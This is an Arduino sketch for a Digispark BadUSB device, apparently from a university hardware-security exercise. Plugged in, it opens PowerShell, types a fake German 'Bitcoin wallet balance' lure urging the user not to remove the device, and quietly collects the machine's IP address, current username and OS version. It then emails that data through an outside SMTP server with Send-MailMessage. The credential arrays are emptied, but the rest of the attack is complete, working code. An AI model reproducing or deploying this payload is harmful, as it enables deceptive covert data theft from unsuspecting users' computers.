// [ ===== Created using duckify.huhn.me @ dev 356a9805 ===== ] //
// Duckify is a free and Open-Source web-app for converting Ducky Script into Arduino code.
// Please consider supporting us on ko-fi.com/spacehuhn <3
// Learn more about us at spacehuhn.com

// Platform: Digispark
// Keyboard Layout: DE

#include "DigiKeyboard.h"

// powershell
const uint8_t key_arr_0[] PROGMEM = {0,19, 0,18, 0,26, 0,8, 0,21, 0,22, 0,11, 0,8, 0,15, 0,15};
// clear
const uint8_t key_arr_1[] PROGMEM = {0,6, 0,15, 0,8, 0,4, 0,21};
// $a = "Prüfe den Kontostand des Bitcoin Wallets"
const uint8_t key_arr_2[] PROGMEM = {2,33, 0,4, 0,44, 2,39, 0,44, 2,31, 2,19, 0,21, 0,47, 0,9, 0,8, 0,44, 0,7, 0,8, 0,17, 0,44, 2,14, 0,18, 0,17, 0,23, 0,18, 0,22, 0,23, 0,4, 0,17, 0,7, 0,44, 0,7, 0,8, 0,22, 0,44, 2,5, 0,12, 0,23, 0,6, 0,18, 0,12, 0,17, 0,44, 2,26, 0,4, 0,15, 0,15, 0,8, 0,23, 0,22, 2,31};
// $a = "Kontostand: 21,7369 BTC = 1.475.350 $"
const uint8_t key_arr_3[] PROGMEM = {2,33, 0,4, 0,44, 2,39, 0,44, 2,31, 2,14, 0,18, 0,17, 0,23, 0,18, 0,22, 0,23, 0,4, 0,17, 0,7, 2,55, 0,44, 0,31, 0,30, 0,54, 0,36, 0,32, 0,35, 0,38, 0,44, 2,5, 2,23, 2,6, 0,44, 2,39, 0,44, 0,30, 0,55, 0,33, 0,36, 0,34, 0,55, 0,32, 0,34, 0,39, 0,44, 2,33, 2,31};
// $a = "Bitte NICHT das Programm beenden und die Wallet NICHT entfernen!"
const uint8_t key_arr_4[] PROGMEM = {2,33, 0,4, 0,44, 2,39, 0,44, 2,31, 2,5, 0,12, 0,23, 0,23, 0,8, 0,44, 2,17, 2,12, 2,6, 2,11, 2,23, 0,44, 0,7, 0,4, 0,22, 0,44, 2,19, 0,21, 0,18, 0,10, 0,21, 0,4, 0,16, 0,16, 0,44, 0,5, 0,8, 0,8, 0,17, 0,7, 0,8, 0,17, 0,44, 0,24, 0,17, 0,7, 0,44, 0,7, 0,12, 0,8, 0,44, 2,26, 0,4, 0,15, 0,15, 0,8, 0,23, 0,44, 2,17, 2,12, 2,6, 2,11, 2,23, 0,44, 0,8, 0,17, 0,23, 0,9, 0,8, 0,21, 0,17, 0,8, 0,17, 2,30, 2,31};
// $a = "Lade Systendaten"
const uint8_t key_arr_5[] PROGMEM = {2,33, 0,4, 0,44, 2,39, 0,44, 2,31, 2,15, 0,4, 0,7, 0,8, 0,44, 2,22, 0,29, 0,22, 0,23, 0,8, 0,17, 0,7, 0,4, 0,23, 0,8, 0,17, 2,31};
// $a = "Bitte warten
const uint8_t key_arr_6[] PROGMEM = {2,33, 0,4, 0,44, 2,39, 0,44, 2,31, 2,5, 0,12, 0,23, 0,23, 0,8, 0,44, 0,26, 0,4, 0,21, 0,23, 0,8, 0,17};
// .
const uint8_t key_arr_7[] PROGMEM = {0,55};
// .
const uint8_t key_arr_8[] PROGMEM = {0,55};
// ."
const uint8_t key_arr_9[] PROGMEM = {0,55, 2,31};
// $1 = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -eq "Ethernet" } | Select-Object -ExpandProperty IPAddress
const uint8_t key_arr_10[] PROGMEM = {2,33, 0,30, 0,44, 2,39, 0,44, 2,10, 0,8, 0,23, 0,56, 2,17, 0,8, 0,23, 2,12, 2,19, 2,4, 0,7, 0,7, 0,21, 0,8, 0,22, 0,22, 0,44, 0,56, 2,4, 0,7, 0,7, 0,21, 0,8, 0,22, 0,22, 2,9, 0,4, 0,16, 0,12, 0,15, 0,29, 0,44, 2,12, 2,19, 0,25, 0,33, 0,44, 64,100, 0,44, 2,26, 0,11, 0,8, 0,21, 0,8, 0,56, 2,18, 0,5, 0,13, 0,8, 0,6, 0,23, 0,44, 64,36, 0,44, 2,33, 2,56, 0,55, 2,12, 0,17, 0,23, 0,8, 0,21, 0,9, 0,4, 0,6, 0,8, 2,4, 0,15, 0,12, 0,4, 0,22, 0,44, 0,56, 0,8, 0,20, 0,44, 2,31, 2,8, 0,23, 0,11, 0,8, 0,21, 0,17, 0,8, 0,23, 2,31, 0,44, 64,39, 0,44, 64,100, 0,44, 2,22, 0,8, 0,15, 0,8, 0,6, 0,23, 0,56, 2,18, 0,5, 0,13, 0,8, 0,6, 0,23, 0,44, 0,56, 2,8, 0,27, 0,19, 0,4, 0,17, 0,7, 2,19, 0,21, 0,18, 0,19, 0,8, 0,21, 0,23, 0,29, 0,44, 2,12, 2,19, 2,4, 0,7, 0,7, 0,21, 0,8, 0,22, 0,22};
// $2 = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
const uint8_t key_arr_11[] PROGMEM = {2,33, 0,31, 0,44, 2,39, 0,44, 64,37, 2,22, 0,29, 0,22, 0,23, 0,8, 0,16, 0,55, 2,22, 0,8, 0,6, 0,24, 0,21, 0,12, 0,23, 0,29, 0,55, 2,19, 0,21, 0,12, 0,17, 0,6, 0,12, 0,19, 0,4, 0,15, 0,55, 2,26, 0,12, 0,17, 0,7, 0,18, 0,26, 0,22, 2,12, 0,7, 0,8, 0,17, 0,23, 0,12, 0,23, 0,29, 64,38, 2,55, 2,55, 2,10, 0,8, 0,23, 2,6, 0,24, 0,21, 0,21, 0,8, 0,17, 0,23, 2,37, 2,38, 0,55, 2,17, 0,4, 0,16, 0,8};
// $os = Get-CimInstance -ClassName Win32_OperatingSystem
const uint8_t key_arr_12[] PROGMEM = {2,33, 0,18, 0,22, 0,44, 2,39, 0,44, 2,10, 0,8, 0,23, 0,56, 2,6, 0,12, 0,16, 2,12, 0,17, 0,22, 0,23, 0,4, 0,17, 0,6, 0,8, 0,44, 0,56, 2,6, 0,15, 0,4, 0,22, 0,22, 2,17, 0,4, 0,16, 0,8, 0,44, 2,26, 0,12, 0,17, 0,32, 0,31, 2,56, 2,18, 0,19, 0,8, 0,21, 0,4, 0,23, 0,12, 0,17, 0,10, 2,22, 0,29, 0,22, 0,23, 0,8, 0,16};
// $3 = $os.Caption 
const uint8_t key_arr_13[] PROGMEM = {2,33, 0,32, 0,44, 2,39, 0,44, 2,33, 0,18, 0,22, 0,55, 2,6, 0,4, 0,19, 0,23, 0,12, 0,18, 0,17, 0,44};
// $4 = $os.Version
const uint8_t key_arr_14[] PROGMEM = {2,33, 0,33, 0,44, 2,39, 0,44, 2,33, 0,18, 0,22, 0,55, 2,25, 0,8, 0,21, 0,22, 0,12, 0,18, 0,17};
// | ConvertTo-SecureString -AsPlainText -Force
const uint8_t key_arr_15[] PROGMEM = {64,100, 0,44, 2,6, 0,18, 0,17, 0,25, 0,8, 0,21, 0,23, 2,23, 0,18, 0,56, 2,22, 0,8, 0,6, 0,24, 0,21, 0,8, 2,22, 0,23, 0,21, 0,12, 0,17, 0,10, 0,44, 0,56, 2,4, 0,22, 2,19, 0,15, 0,4, 0,12, 0,17, 2,23, 0,8, 0,27, 0,23, 0,44, 0,56, 2,9, 0,18, 0,21, 0,6, 0,8};
// $cred = New-Object -TypeName System.Management.Automation.PSCredential($user, $pass)
const uint8_t key_arr_16[] PROGMEM = {2,33, 0,6, 0,21, 0,8, 0,7, 0,44, 2,39, 0,44, 2,17, 0,8, 0,26, 0,56, 2,18, 0,5, 0,13, 0,8, 0,6, 0,23, 0,44, 0,56, 2,23, 0,29, 0,19, 0,8, 2,17, 0,4, 0,16, 0,8, 0,44, 2,22, 0,29, 0,22, 0,23, 0,8, 0,16, 0,55, 2,16, 0,4, 0,17, 0,4, 0,10, 0,8, 0,16, 0,8, 0,17, 0,23, 0,55, 2,4, 0,24, 0,23, 0,18, 0,16, 0,4, 0,23, 0,12, 0,18, 0,17, 0,55, 2,19, 2,22, 2,6, 0,21, 0,8, 0,7, 0,8, 0,17, 0,23, 0,12, 0,4, 0,15, 2,37, 2,33, 0,24, 0,22, 0,8, 0,21, 0,54, 0,44, 2,33, 0,19, 0,4, 0,22, 0,22, 2,38};
// $smtp = "mail.th-brandenburg.de"
const uint8_t key_arr_17[] PROGMEM = {2,33, 0,22, 0,16, 0,23, 0,19, 0,44, 2,39, 0,44, 2,31, 0,16, 0,4, 0,12, 0,15, 0,55, 0,23, 0,11, 0,56, 0,5, 0,21, 0,4, 0,17, 0,7, 0,8, 0,17, 0,5, 0,24, 0,21, 0,10, 0,55, 0,7, 0,8, 2,31};
// Send-MailMessage -From $a -to $a -Subject "HardwareSec" -Body "$1 $2 $3 $4" -SmtpServer $smtp -Port 587 -Credential $cred
const uint8_t key_arr_18[] PROGMEM = {2,22, 0,8, 0,17, 0,7, 0,56, 2,16, 0,4, 0,12, 0,15, 2,16, 0,8, 0,22, 0,22, 0,4, 0,10, 0,8, 0,44, 0,56, 2,9, 0,21, 0,18, 0,16, 0,44, 2,33, 0,4, 0,44, 0,56, 0,23, 0,18, 0,44, 2,33, 0,4, 0,44, 0,56, 2,22, 0,24, 0,5, 0,13, 0,8, 0,6, 0,23, 0,44, 2,31, 2,11, 0,4, 0,21, 0,7, 0,26, 0,4, 0,21, 0,8, 2,22, 0,8, 0,6, 2,31, 0,44, 0,56, 2,5, 0,18, 0,7, 0,29, 0,44, 2,31, 2,33, 0,30, 0,44, 2,33, 0,31, 0,44, 2,33, 0,32, 0,44, 2,33, 0,33, 2,31, 0,44, 0,56, 2,22, 0,16, 0,23, 0,19, 2,22, 0,8, 0,21, 0,25, 0,8, 0,21, 0,44, 2,33, 0,22, 0,16, 0,23, 0,19, 0,44, 0,56, 2,19, 0,18, 0,21, 0,23, 0,44, 0,34, 0,37, 0,36, 0,44, 0,56, 2,6, 0,21, 0,8, 0,7, 0,8, 0,17, 0,23, 0,12, 0,4, 0,15, 0,44, 2,33, 0,6, 0,21, 0,8, 0,7};


// Dieser Block wurde manuell hinzugefügt und enthält  sensible Anmeldedaten. In dieser Version wurden die Arrays geleert 

// addr
const uint8_t key_arr_addr[] PROGMEM = {};
// pass
const uint8_t key_arr_pass[] PROGMEM = {};
//user
const uint8_t key_arr_user[] PROGMEM = {};


void duckyString(const uint8_t* keys, size_t len) {  
    for(size_t i=0; i<len; i+=2) {
        DigiKeyboard.sendKeyStroke(pgm_read_byte_near(keys + i+1), pgm_read_byte_near(keys + i));
    }
}

//Diese Funktion wurde verändert, um Strings langsam eingeben zu können
void duckyString_slow(const uint8_t* keys, size_t len) {  
    for(size_t i=0; i<len; i+=2) {
        DigiKeyboard.sendKeyStroke(pgm_read_byte_near(keys + i+1), pgm_read_byte_near(keys + i));
        DigiKeyboard.delay(70); // DELAY 70
    }
}

void setup() {
    pinMode(1, OUTPUT); // Enable LED
    digitalWrite(1, LOW); // Turn LED off
    DigiKeyboard.sendKeyStroke(0); // Tell computer no key is pressed

    DigiKeyboard.delay(500); // DELAY 500
    DigiKeyboard.sendKeyStroke(21, 8); // GUI r
    DigiKeyboard.delay(500); // DELAY 500
    duckyString(key_arr_0, sizeof(key_arr_0)); // STRING powershell
    DigiKeyboard.delay(100); // DELAY 100
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(500); // DELAY 500
    duckyString(key_arr_1, sizeof(key_arr_1)); // STRING clear
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(100); // DELAY 100
    duckyString_slow(key_arr_2, sizeof(key_arr_2)); // STRING $a = "Prüfe den Kontostand des Bitcoin ...
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    duckyString_slow(key_arr_3, sizeof(key_arr_3)); // STRING $a = "Kontostand: 21,7369 BTC = 1.475.3...
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    duckyString_slow(key_arr_4, sizeof(key_arr_4)); // STRING $a = "Bitte NICHT das Programm beenden ...
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    duckyString_slow(key_arr_5, sizeof(key_arr_5)); // STRING $a = "Lade Systendaten"
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    duckyString_slow(key_arr_6, sizeof(key_arr_6)); // STRING $a = "Bitte warten
    DigiKeyboard.delay(700); // DELAY 700
    duckyString(key_arr_7, sizeof(key_arr_7)); // STRING .
    DigiKeyboard.delay(700); // DELAY 700
    duckyString(key_arr_8, sizeof(key_arr_8)); // STRING .
    DigiKeyboard.delay(700); // DELAY 700
    duckyString(key_arr_9, sizeof(key_arr_9)); // STRING ."
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    duckyString(key_arr_10, sizeof(key_arr_10)); // STRING $1 = Get-NetIPAddress -AddressFamily IP...
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    duckyString(key_arr_11, sizeof(key_arr_11)); // STRING $2 = [System.Security.Principal.Windows...
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    duckyString(key_arr_12, sizeof(key_arr_12)); // STRING $os = Get-CimInstance -ClassName Win32_...
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    duckyString(key_arr_13, sizeof(key_arr_13)); // STRING $3 = $os.Caption 
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    duckyString(key_arr_14, sizeof(key_arr_14)); // STRING $4 = $os.Version
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
   
    // Dieser Block wurde manuell hinzugefügt und gibt sensible Anmeldedaten ein
    duckyString(key_arr_addr, sizeof(key_arr_addr)); 
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    duckyString(key_arr_user, sizeof(key_arr_user));
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    duckyString(key_arr_pass, sizeof(key_arr_pass)); 
    
    duckyString(key_arr_15, sizeof(key_arr_15)); // STRING | ConvertTo-SecureString -AsPlainText -...
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    duckyString(key_arr_16, sizeof(key_arr_16)); // STRING $cred = New-Object -TypeName System.Man...
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    duckyString(key_arr_17, sizeof(key_arr_17)); // STRING $smtp = "mail.th-brandenburg.de"
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    duckyString(key_arr_18, sizeof(key_arr_18)); // STRING Send-MailMessage -From $a -to $a -Subje...
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
}

void loop() {}

// Created using duckify.huhn.me @ dev 356a9805
